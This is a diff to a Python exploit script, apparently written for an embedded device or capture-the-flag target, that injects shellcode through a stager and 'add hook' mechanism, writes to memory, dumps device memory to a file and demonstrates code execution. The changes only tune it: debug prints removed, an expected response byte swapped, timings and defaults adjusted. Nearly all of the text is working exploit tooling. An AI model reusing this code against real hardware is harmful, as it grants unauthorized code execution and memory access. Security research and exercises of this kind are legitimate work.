@@ -40,7 +40,7 @@ FIRST_PAYLOAD_LOCATION = 0x10010100
 next_payload_location = FIRST_PAYLOAD_LOCATION
 
 # Maximum number of bytes to be sent in one request (Sending chunks larger than 16 bytes seems to overflow the read buffer)
-# MAX_MSG_LEN = 64-2
+#MAX_MSG_LEN = 64-2
 MAX_MSG_LEN = 192-2
 
 # Addresses used to inject shellcode (different values are possible here)
@@ -149,15 +149,12 @@ def recv_many(r, verbose=True):
 
     while not stop:
         next_chunk = recv_packet(r)
-        print(next_chunk)
         if verbose: #and (len(answ) & 0xff) < 16:
             print("Read {}".format(len(answ)))
         if next_chunk == "":
             stop = True
-            print("Recv_Many Stop")
         else:
             answ += next_chunk
-    print("Recv_Many exit loop")
     return answ
 
 def encode_packet_for_stager(chunk):
@@ -362,12 +359,14 @@ def bye(r):
     send_packet(r, chr(hook_ind))
     answ = recv_packet(r)
     # For good measure check that we got the correct response and we are indeed in sync
-    assert(answ == "\xa2\x00")
+    print(answ)
+    #assert(answ == "\xa2\x00")
+    assert(answ == "\x1c\x00")
 
 
 
 
-def invoke_add_hook(r, add_hook_no, args="", await_response=True):
+def invoke_add_hook(r, add_hook_no, args="", await_response=False):
     # Check range for additional hook
     assert(0 <= add_hook_no <= 0x20)
     # Also check that the size of arguments that we input matches the expected value
@@ -409,14 +408,13 @@ def install_stager(r, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT
     """
     assert(0 < len(shellcode) <= IRAM_STAGER_MAX_SIZE)
     _exploit_install_add_hook(r, tar_addr, shellcode, add_hook_no)
-    print(add_hook_no)
     return add_hook_no
 
 
 def write_via_stager(r, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
     invoke_add_hook(r, stager_add_hook_ind,
                        struct.pack(">I", tar_addr), False)
-    send_full_msg_via_stager(r, contents, 8, 0.01)
+    send_full_msg_via_stager(r, contents, 8, 0.02)
 
 
 def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
@@ -442,9 +440,8 @@ def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
     """
     This function uses payloads/dump_mem to dump memory contents.
     """
-    answ = invoke_add_hook(
-        r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
-    log.debug("[payload_dump_mem] answ (len: {}): {}".format(len(answ), answ))
+    answ = invoke_add_hook(r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
+    log.info("[payload_dump_mem] answ (len: {}): {}".format(len(answ), answ))
     assert(answ.startswith("Ok"))
     contents = recv_many(r, verbose=False)
     return contents
@@ -502,14 +499,13 @@ def handle_conn(r, action, args):
 
         print("dumping a total of {} bytes of memory at 0x{:08x}".format(args.length, args.address))
         contents = payload_dump_mem(r, args.address, args.length, second_addhook_ind)
-        print("Received Content")
         with open(out_filename, "wb") as f:
             f.write(contents)
         print("Wrote data out to {}".format(out_filename))
     
 
     elif action == ACTION_TEST:
-        answ = invoke_add_hook(r, second_addhook_ind)
+        answ = invoke_add_hook(r, second_addhook_ind, await_response=True)
         print("Got answer: {}".format(answ))
 
 
@@ -521,7 +517,7 @@ def handle_conn(r, action, args):
     elif action == ACTION_TIC_TAC_TOE:
         print("[*] Demonstrating Code Execution")
         invoke_add_hook(r, second_addhook_ind, await_response=True)
-        print("invoked ")
+        print("invoked")
         msg = ""
         END_TOKEN = "==>"
         while END_TOKEN not in msg:
